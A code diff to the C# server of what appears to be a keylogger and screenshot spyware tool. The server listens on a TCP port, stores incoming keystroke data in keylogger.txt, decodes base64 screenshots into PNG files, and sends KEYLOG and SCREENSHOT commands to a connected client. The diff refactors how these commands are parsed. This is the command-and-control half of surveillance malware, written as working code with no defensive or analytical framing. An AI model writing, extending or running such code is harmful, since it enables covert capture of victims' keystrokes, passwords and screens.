@@ -21,6 +21,7 @@ namespace Server
 
         static NetworkStream stream;
 
+
         void StartServer()
         {
             TcpListener server = null;
@@ -30,8 +31,6 @@ namespace Server
                 server = new TcpListener(IPAddress.Any, port);
                 server.Start();
 
-
-           
                 String decodedData = null;
 
                 Console.Write("Waiting for a connection... ");
@@ -57,21 +56,22 @@ namespace Server
                     }
 
                     decodedData = System.Text.Encoding.ASCII.GetString(data, 0, dataLength);
+                    String[] command = decodedData.Split('|');
+                    command[0] = command[0].ToUpper();
+
                     Console.WriteLine("Received: {0}", decodedData);
 
-                    if (decodedData.ToUpper().StartsWith("DATA"))
+                    if (command[0] == "DATA")
                     {
                         StreamWriter file = new StreamWriter(Directory.GetCurrentDirectory() + "/keylogger.txt", true);
-                        file.Write(decodedData.Remove(0, "DATA".Length));
+                        file.Write(command[1]);
                         file.Close();
                     }
-                    else if (decodedData.ToUpper().StartsWith("IMAGE"))
+                    else if (command[0] == "IMAGE")
                     {
-                        Console.WriteLine("Received: {0}", "screenshot");
-                        string strm = decodedData.Remove(0, "IMAGE".Length);
                         var myfilename = string.Format(@"{0}", Guid.NewGuid());
                         string filepath = (Directory.GetCurrentDirectory() + "/" + myfilename + ".png");
-                        var bytess = Convert.FromBase64String(strm);
+                        var bytess = Convert.FromBase64String(command[1]);
                         using (var imageFile = new FileStream(filepath, FileMode.Create))
                         {
                             imageFile.Write(bytess, 0, bytess.Length);
@@ -79,7 +79,7 @@ namespace Server
                         }
                         Console.WriteLine("Received: {0}", "screenshot");
                     }
-                    else if (decodedData.ToUpper().StartsWith("DISCONNECT"))
+                    else if (command[0] == "DISCONNECT")
                     {
                         Console.WriteLine("Received: {0}", decodedData);
                         server.Stop();
@@ -96,6 +96,9 @@ namespace Server
                 server.Stop();
             }
         }
+
+
+
         void ConsoleInput()
         {
             while (true)
@@ -114,7 +117,7 @@ namespace Server
                 else if (Command[0] == "KEYLOG")
                 {
                     byte[] msg = Encoding.ASCII.GetBytes("SENDKCAPTURE");
-                    SendData(stream, msg);                  
+                    SendData(stream, msg);
                     Console.WriteLine("Sent: {0}", "SENDKCAPTURE");
                 }
                 else if (Command[0] == "SCREENSHOT")
